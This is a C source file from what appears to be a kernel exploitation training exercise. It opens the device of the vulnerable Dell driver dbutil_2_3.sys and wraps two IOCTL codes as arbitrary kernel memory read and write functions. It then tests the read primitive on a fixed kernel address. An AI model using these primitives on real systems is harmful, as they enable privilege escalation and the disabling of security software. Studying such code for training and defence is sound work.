/*
 *  Exercise 2
 *  We have 2 interesting IOCTLs, what is their function?
 *  What argument(s) do we have to pass to abuse them?
 */


#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <stdint.h>


#define ARBITRARY_READ_IOCTL    0x9b0c1ec4
#define ARBITRARY_WRITE_IOCTL   0x9b0c1ec8


typedef struct data_struct
{
    uint64_t buff_sz;
    uint8_t *address;
    uint64_t offset;
    uint64_t data;
} DATA;


void
write_mem(HANDLE h, uint8_t *addr, uint64_t value)
{
    uint32_t tmp;
    DATA data;

    data.address    = addr;
    data.offset     = 0;
    data.data       = value;

    if (!DeviceIoControl(h, ARBITRARY_WRITE_IOCTL, &data, sizeof(data), &data, sizeof(data), &tmp, NULL))
        printf("DeviceIoControl error in write_mem\n");
}

uint64_t
read_mem(HANDLE h, uint8_t *addr)
{
    uint32_t tmp;
    DATA data;

    data.address    = addr;
    data.offset     = 0;
    
    if (!DeviceIoControl(h, ARBITRARY_READ_IOCTL, &data, sizeof(data), &data, sizeof(data), &tmp, NULL))
        printf("DeviceIoControl error in read_mem\n");

    return data.data;
}



int main(int argc, char *argv[]) {

    HANDLE h = CreateFile("\\\\.\\dbutil_2_3", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE)
    {
        printf("FATAL ERROR: Failed to open handle, check if dbutil_2_3.sys is running\n");
        exit(-1);
    }

    // If the following read_mem call doesn't crash, everything has gone right
    uint8_t *kuser_shared_address = (uint8_t *)0xfffff78000000000;
    printf("%llX\n", read_mem(h, kuser_shared_address));



    CloseHandle(h);

    return 0;
}